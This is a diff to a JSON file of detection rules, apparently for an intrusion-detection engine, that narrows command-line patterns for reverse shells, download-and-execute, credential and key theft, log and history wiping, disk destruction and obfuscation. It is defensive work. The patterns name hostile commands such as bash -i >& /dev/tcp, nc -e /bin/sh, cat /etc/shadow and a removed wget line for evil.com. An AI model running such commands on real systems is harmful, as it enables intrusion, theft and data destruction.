@@ -12,7 +12,6 @@
         "cmdline_contains_any": [
           "base64 -d",
           "base64 --decode",
-          "| base64",
           "base64 -D"
         ]
       }
@@ -29,11 +28,11 @@
         "cmdline_contains_any": [
           "/dev/tcp/",
           "/dev/udp/",
-          "nc -e",
-          "ncat -e",
+          "nc -e /bin",
+          "ncat -e /bin",
           "bash -i >& /dev/tcp",
-          "bash -i >",
-          "sh -i >",
+          "bash -i >&",
+          "sh -i >&",
           "exec 5<>/dev/tcp"
         ]
       }
@@ -48,10 +47,10 @@
       "condition": {
         "type": "process",
         "cmdline_contains_any": [
-          "import socket",
-          "import subprocess",
-          "from socket",
-          "from subprocess"
+          "python.*import socket",
+          "python.*import subprocess",
+          "python.*from socket",
+          "python.*from subprocess"
         ]
       }
     },
@@ -65,8 +64,11 @@
       "condition": {
         "type": "process",
         "cmdline_contains_any": [
-          "crontab",
-          "'* * * * *"
+          "crontab -e",
+          "crontab -l",
+          "crontab -r",
+          "echo .* >> /etc/cron",
+          "/var/spool/cron"
         ]
       }
     },
@@ -80,13 +82,11 @@
       "condition": {
         "type": "process",
         "cmdline_contains_any": [
-          ".bashrc",
-          ".bash_profile",
-          ".profile",
-          ".zshrc",
           ">> ~/.bashrc",
-          "echo '#test' >> ~/.bashrc",
-          ".bashrc.bak"
+          ">> ~/.bash_profile",
+          ">> ~/.profile",
+          ">> ~/.zshrc",
+          "echo .* >> ~/\\.bashrc"
         ]
       }
     },
@@ -100,12 +100,11 @@
       "condition": {
         "type": "process",
         "cmdline_contains_any": [
-          ".service",
-          "systemctl",
-          "/etc/systemd",
-          "ExecStart=",
-          "echo '[service]",
-          "execstart=/bin/true"
+          "systemctl enable",
+          "systemctl daemon-reload",
+          "/etc/systemd/system/.*\\.service",
+          "ExecStart=/",
+          "cat .* > .*\\.service"
         ]
       }
     },
@@ -121,10 +120,10 @@
         "cmdline_contains_any": [
           "history -c",
           "history -w",
-          "unset histfile",
-          "histsize=0",
-          "rm ~/.bash_history",
-          "history -c 2>/dev/null"
+          "unset HISTFILE",
+          "HISTSIZE=0",
+          "rm .*\\.bash_history",
+          "truncate .* ~/.bash_history"
         ]
       }
     },
@@ -138,9 +137,9 @@
       "condition": {
         "type": "process",
         "cmdline_contains_any": [
-          "touch -t",
-          "touch -d",
-          "touch --date"
+          "touch -t ",
+          "touch -d ",
+          "touch --date="
         ]
       }
     },
@@ -154,8 +153,8 @@
       "condition": {
         "type": "process",
         "cmdline_contains_any": [
-          "/dev/shm/",
-          "/run/shm/",
+          "/dev/shm/[a-zA-Z]",
+          "/run/shm/[a-zA-Z]",
           "memfd_create",
           "memfd://"
         ]
@@ -171,15 +170,10 @@
       "condition": {
         "type": "process",
         "cmdline_contains_any": [
-          "exec -a",
-          "[kworker",
-          "[migration",
-          "[ksoftirq",
-          "[kthreadd",
-          "[kworker/0:0]",
-          "[kworker/0:0] 0.1",
-          "sleep 0.1",
-          "exec -a '[kworker/0:0]'"
+          "exec -a '\\[",
+          "exec -a \"\\[",
+          "exec -a \\[kworker",
+          "prctl\\(PR_SET_NAME"
         ]
       }
     },
@@ -193,9 +187,11 @@
       "condition": {
         "type": "process",
         "cmdline_contains_any": [
-          "/etc/shadow",
           "cat /etc/shadow",
-          "less /etc/shadow"
+          "less /etc/shadow",
+          "head /etc/shadow",
+          "tail /etc/shadow",
+          "cp /etc/shadow"
         ]
       }
     },
@@ -209,10 +205,11 @@
       "condition": {
         "type": "process",
         "cmdline_contains_any": [
-          "id_rsa",
-          "id_ed25519",
-          "id_ecdsa",
-          ".ssh/"
+          "cat .*id_rsa",
+          "cat .*id_ed25519",
+          "cat .*id_ecdsa",
+          "cp .*\\.ssh/",
+          "scp .*id_rsa"
         ]
       }
     },
@@ -226,10 +223,10 @@
       "condition": {
         "type": "process",
         "cmdline_contains_any": [
-          "grep -r password",
-          "grep -ri password",
-          "grep password",
-          "grep -r 'password'"
+          "grep -r.*password",
+          "grep -ri.*password",
+          "grep.*PASSWORD",
+          "find .* -name .*password"
         ]
       }
     },
@@ -243,9 +240,9 @@
       "condition": {
         "type": "process",
         "cmdline_contains_any": [
-          ".aws/credentials",
-          "AWS_SECRET",
-          "aws configure"
+          "cat .*\\.aws/credentials",
+          "cp .*\\.aws/credentials",
+          "AWS_SECRET_ACCESS_KEY"
         ]
       }
     },
@@ -260,9 +257,8 @@
         "type": "process",
         "cmdline_contains_any": [
           "cat /etc/passwd",
-          "/etc/passwd",
           "getent passwd",
-          "cut -d: -f1 | head -5"
+          "cut -d: -f1 /etc/passwd"
         ]
       }
     },
@@ -276,10 +272,10 @@
       "condition": {
         "type": "process",
         "cmdline_contains_any": [
-          "ss -",
-          "netstat -",
           "ss -tunapl",
-          "netstat -tunapl"
+          "ss -tulpn",
+          "netstat -tunapl",
+          "netstat -tulpn"
         ]
       }
     },
@@ -293,11 +289,10 @@
       "condition": {
         "type": "process",
         "cmdline_contains_any": [
-          "clamav",
-          "falcon",
-          "defender",
-          "sophos",
-          "crowdstrike"
+          "ps.*clamav",
+          "ps.*falcon",
+          "systemctl.*crowdstrike",
+          "pgrep -f.*defender"
         ]
       }
     },
@@ -311,14 +306,10 @@
       "condition": {
         "type": "process",
         "cmdline_contains_any": [
-          "curl ",
-          "wget ",
-          "curl http",
-          "wget http",
-          "curl -s",
-          "wget -q",
-          "curl -s --max-time",
-          "wget http://example.com"
+          "curl -s http",
+          "curl --silent http",
+          "wget -q http",
+          "curl -s --max-time"
         ]
       }
     },
@@ -332,19 +323,12 @@
       "condition": {
         "type": "process",
         "cmdline_contains_any": [
-          "curl | sh",
-          "curl | bash",
-          "wget | sh",
-          "wget | bash",
-          "curl -o",
-          "wget -O",
-          "wget http",
-          "curl http",
-          "wget http://evil.com/mal -o",
-          "wget http://evil.com/mal -O",
-          "curl -sSf",
-          "wget http://evil.com/mal -o /tmp/mal",
-          "wget http://evil.com/mal -O /tmp/mal"
+          "curl.*\\| sh",
+          "curl.*\\| bash",
+          "wget.*\\| sh",
+          "wget.*\\| bash",
+          "wget -O - http.*\\|",
+          "curl -sSf.*\\|"
         ]
       }
     },
@@ -359,14 +343,11 @@
         "type": "process",
         "cmdline_contains_any": [
           "files encrypted",
-          "send btc",
-          "btc",
-          "ransom",
-          ".locked",
-          ".encrypted",
-          "encrypted - send btc",
-          "decrypt key",
-          "files encrypted - send btc"
+          "send btc to",
+          "\\.locked$",
+          "\\.encrypted$",
+          "decrypt.*key",
+          "YOUR_FILES_ARE"
         ]
       }
     },
@@ -380,13 +361,12 @@
       "condition": {
         "type": "process",
         "cmdline_contains_any": [
-          "rm -rf /",
+          "rm -rf /(?:\\s|$|['\"])",
+          "rm -rf /[^h]",
           "rm -rf /*",
-          "dd if=/dev/zero",
-          "shred ",
-          "wipe ",
-          "echo 'rm -rf /'",
-          "mkfs"
+          "dd if=/dev/zero of=/dev/sd",
+          "shred -f",
+          "mkfs\\..* /dev/sd"
         ]
       }
     },
@@ -400,9 +380,11 @@
       "condition": {
         "type": "process",
         "cmdline_contains_any": [
-          "docker.sock",
-          "/var/run/docker.sock",
-          "ls -la /var/run/docker.sock"
+          "/var/run/docker\\.sock",
+          "/run/docker\\.sock",
+          "curl.*docker\\.sock",
+          "docker -H unix:///var/run/docker.sock",
+          "mount.*docker\\.sock"
         ]
       }
     },
@@ -417,10 +399,8 @@
         "type": "process",
         "cmdline_contains_any": [
           "io_uring",
-          "iouring",
-          "/proc/*/fd | xargs",
-          "ls /proc/*/fd",
-          "io_uring check"
+          "io_uring_setup",
+          "io_uring_enter"
         ]
       }
     },
@@ -430,11 +410,16 @@
       "technique": "T1027",
       "tactic": "Defense Evasion",
       "severity": "high",
+      "description": "Detects hex encoded shell commands",
       "condition": {
         "type": "process",
         "cmdline_contains_any": [
-          "echo -e",
-          "\\x"
+          "echo -e '\\\\x[0-9a-fA-F]",
+          "echo -e \"\\\\x[0-9a-fA-F]",
+          "printf '\\\\x[0-9a-fA-F]",
+          "printf \"\\\\x[0-9a-fA-F]",
+          "\\$'\\\\x[0-9a-fA-F]",
+          "\\\\x[0-9a-fA-F]{2}\\\\x[0-9a-fA-F]{2}"
         ]
       }
     },
@@ -444,11 +429,12 @@
       "technique": "T1027",
       "tactic": "Defense Evasion",
       "severity": "high",
+      "description": "Detects octal encoded shell commands",
       "condition": {
         "type": "process",
         "cmdline_contains_any": [
-          "$'\\",
-          "\\1"
+          "\\$'\\\\[0-7]{3}",
+          "echo -e '\\\\[0-7]{3}"
         ]
       }
     },
@@ -458,11 +444,14 @@
       "technique": "T1027",
       "tactic": "Defense Evasion",
       "severity": "medium",
+      "description": "Detects ROT13 encoding in commands",
       "condition": {
         "type": "process",
         "cmdline_contains_any": [
-          "n-za-mN-ZA-M",
-          "| tr"
+          "tr 'A-Za-z' 'N-ZA-Mn-za-m'",
+          "tr a-zA-Z n-za-mN-ZA-M",
+          "tr \"a-zA-Z\" \"n-za-mN-ZA-M\"",
+          "tr \"A-Za-z\" \"N-ZA-Mn-za-m\""
         ]
       }
     },
@@ -472,12 +461,13 @@
       "technique": "T1027",
       "tactic": "Defense Evasion",
       "severity": "medium",
+      "description": "Detects reverse string obfuscation",
       "condition": {
         "type": "process",
         "cmdline_contains_any": [
-          "| rev |",
-          "| rev|",
-          "|rev |"
+          "\\| rev \\|",
+          "\\| rev\\| ",
+          "\\|rev \\|"
         ]
       }
     },
@@ -487,16 +477,14 @@
       "technique": "T1027",
       "tactic": "Defense Evasion",
       "severity": "high",
+      "description": "Detects environment variable slicing for evasion",
       "condition": {
         "type": "process",
         "cmdline_contains_any": [
-          "${PATH:0:1}",
-          "${PATH:",
-          "${HOME:0:",
-          "${HOME:",
-          "${PWD:",
-          "${SHELL:",
-          "etc${PATH:0:1}passwd"
+          "\\$\\{PATH:0:1\\}",
+          "\\$\\{HOME:0:",
+          "\\$\\{PWD:0:",
+          "\\$\\{SHELL:0:"
         ]
       }
     },
@@ -510,9 +498,8 @@
       "condition": {
         "type": "process",
         "cmdline_contains_any": [
-          "base64 -d | base64 -d",
-          "base64 --decode | base64",
-          "| base64 -d | base64"
+          "base64 -d.*base64 -d",
+          "base64 --decode.*base64"
         ]
       }
     },
@@ -526,9 +513,8 @@
       "condition": {
         "type": "process",
         "cmdline_contains_any": [
-          "a=\"",
-          "b=\"",
-          "$a$b"
+          "\\$a\\$b",
+          "\\$\\{a\\}\\$\\{b\\}"
         ]
       }
     },
@@ -542,8 +528,9 @@
       "condition": {
         "type": "process",
         "cmdline_contains_any": [
-          "{e,c,h,o}",
-          "{c,a,t}"
+          "\\{e,c,h,o\\}",
+          "\\{c,a,t\\}",
+          "\\{w,h,o,a,m,i\\}"
         ]
       }
     },
@@ -557,7 +544,7 @@
       "condition": {
         "type": "process",
         "cmdline_contains_any": [
-          "IFS="
+          "IFS=.*;"
         ]
       }
     },
@@ -571,8 +558,8 @@
       "condition": {
         "type": "process",
         "cmdline_contains_any": [
-          "`echo",
-          "`cat"
+          "`echo.*`",
+          "`cat.*`"
         ]
       }
     },
@@ -586,8 +573,8 @@
       "condition": {
         "type": "process",
         "cmdline_contains_any": [
-          "\\u00",
-          "printf"
+          "\\\\u00[0-9a-fA-F]{2}",
+          "printf.*\\\\u"
         ]
       }
     },
@@ -601,12 +588,9 @@
       "condition": {
         "type": "process",
         "cmdline_contains_any": [
-          "python3 -c",
-          "python -c",
-          "xor",
-          "decode",
-          "xor decode",
-          "test xor decode"
+          "python.*xor",
+          "perl.*xor",
+          "ruby.*xor"
         ]
       }
     },
@@ -620,7 +604,7 @@
       "condition": {
         "type": "process",
         "cmdline_contains_any": [
-          "AAAAAAAAAA"
+          "[A-Za-z0-9+=]{50,}"
         ]
       }
     },
@@ -634,18 +618,16 @@
       "condition": {
         "type": "process",
         "cmdline_contains_any": [
-          "shell_exec",
-          "php -r",
-          "php -r shell_exec",
-          "passthru(",
-          "system(",
-          "exec("
+          "php.*shell_exec",
+          "php -r.*system\\(",
+          "php -r.*passthru\\(",
+          "php -r.*exec\\("
         ]
       }
     },
     {
       "id": "heur_script_download_exec",
-      "name": "Download and Execute",
+      "name": "Download and Execute Script",
       "technique": "T1105",
       "tactic": "Command and Control",
       "severity": "critical",
@@ -653,9 +635,12 @@
       "condition": {
         "type": "process",
         "cmdline_contains_any": [
-          "curl http",
-          "| bash",
-          "| sh"
+          "curl http.*\\| bash",
+          "curl http.*\\| sh",
+          "wget http.*\\| bash",
+          "wget http.*\\| sh",
+          "bash -c.*curl",
+          "sh -c.*wget"
         ]
       }
     },
@@ -669,12 +654,12 @@
       "condition": {
         "type": "process",
         "cmdline_contains_any": [
-          "/dev/shm/",
-          "/run/shm/",
+          "/dev/shm/[a-z]",
+          "/run/shm/[a-z]",
           "memfd:",
-          "/proc/self/fd",
-          "bash <(curl",
-          "bash <(wget"
+          "/proc/self/fd/",
+          "bash <\\(curl",
+          "bash <\\(wget"
         ]
       }
     },
@@ -688,7 +673,9 @@
       "condition": {
         "type": "process",
         "cmdline_contains_any": [
-          "LD_PRELOAD="
+          "LD_PRELOAD=/",
+          "LD_PRELOAD=\\./",
+          "ptrace\\(PTRACE_ATTACH"
         ]
       }
     },
@@ -702,8 +689,10 @@
       "condition": {
         "type": "process",
         "cmdline_contains_any": [
-          "tar czf",
-          "| curl"
+          "tar.*\\| curl",
+          "tar.*\\| nc ",
+          "cat.*\\| curl.*-X POST",
+          "zip.*\\| curl"
         ]
       }
     },
@@ -717,7 +706,9 @@
       "condition": {
         "type": "process",
         "cmdline_contains_any": [
-          "dig +short"
+          "dig.*\\+short.*TXT",
+          "dig.*TXT.*\\+short",
+          "nslookup.*-type=TXT"
         ]
       }
     },
@@ -732,7 +723,9 @@
         "type": "process",
         "cmdline_contains_any": [
           "xmrig",
-          "stratum"
+          "stratum\\+tcp://",
+          "stratum\\+ssl://",
+          "minerd"
         ]
       }
     },
@@ -746,8 +739,9 @@
       "condition": {
         "type": "process",
         "cmdline_contains_any": [
-          "insmod ",
-          ".ko"
+          "insmod /",
+          "insmod \\./",
+          "\\.ko$"
         ]
       }
     },
@@ -761,8 +755,9 @@
       "condition": {
         "type": "process",
         "cmdline_contains_any": [
-          "> /var/log",
-          "/var/log/auth"
+          "> /var/log/",
+          "truncate.*/var/log/",
+          "rm.*/var/log/"
         ]
       }
     },
@@ -776,8 +771,8 @@
       "condition": {
         "type": "process",
         "cmdline_contains_any": [
-          "openssl enc",
-          "YOUR_FILES"
+          "openssl enc -aes",
+          "YOUR_FILES_ARE_ENCRYPTED"
         ]
       }
     },
@@ -791,8 +786,8 @@
       "condition": {
         "type": "process",
         "cmdline_contains_any": [
-          "dd if=/dev/zero",
-          "of=/dev/sd"
+          "dd if=/dev/zero of=/dev/sd",
+          "dd if=/dev/urandom of=/dev/sd"
         ]
       }
     },
@@ -807,7 +802,8 @@
         "type": "process",
         "cmdline_contains_any": [
           "mimipenguin",
-          "lazagne"
+          "lazagne",
+          "linux-exploit-suggester"
         ]
       }
     },
@@ -821,8 +817,10 @@
       "condition": {
         "type": "process",
         "cmdline_contains_any": [
-          "/dev/tcp",
-          "bash -i"
+          "bash -i >& /dev/tcp",
+          "bash -i >&/dev/tcp",
+          "nc.*-e /bin/sh",
+          "ncat.*-e /bin/bash"
         ]
       }
     },
@@ -836,8 +834,9 @@
       "condition": {
         "type": "process",
         "cmdline_contains_any": [
-          "authorized_keys",
-          "ssh-rsa"
+          ">> .*authorized_keys",
+          "echo.*ssh-rsa.*>>",
+          "cat.*>> .*authorized_keys"
         ]
       }
     }
